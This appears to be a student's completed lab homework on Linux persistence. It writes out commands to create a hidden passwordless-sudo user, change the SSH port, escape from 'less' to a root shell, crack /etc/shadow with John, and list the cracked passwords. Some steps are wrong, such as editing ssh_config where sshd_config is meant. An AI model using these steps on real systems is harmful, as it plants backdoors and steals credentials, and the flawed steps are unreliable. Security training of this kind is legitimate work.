Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    sudo useradd sysd

2. Give your secret user a password: 
    sudo passwd sysd (passw0rd)

3. Give your secret user a system UID < 1000:
    sudo usermod -u 123 sysd

4. Give your secret user the same GID:
   sudo groupmod -g 123 sysd

5. Give your secret user full `sudo` access without the need for a password:
   sudo usermod -aG sudo sysd
   visudo
   sysd ALL=(ALL) NOPASSWD:ALL
6. Test that `sudo` access works without your password:
su sysd
sudo -l
sudo apt update

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

sudo nano /etc/ssh/ssh_config
port 2222

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    sudo systemctl reload ssh

2. Exit the `root` account:
    sudo su

3. SSH to the target machine using your `sysd` account and port `2222`:
    ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    sudo su

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    sudo less /etc/profile
	!/bin/sh
	john /etc/shadow
	
	passwords:
	trustno1 (mitnik)
	dragon (lovelace)
	lakers (turing)
	passw0rd (sysadmin)
	passw0rd (sysd)
	Goodluck! (student)
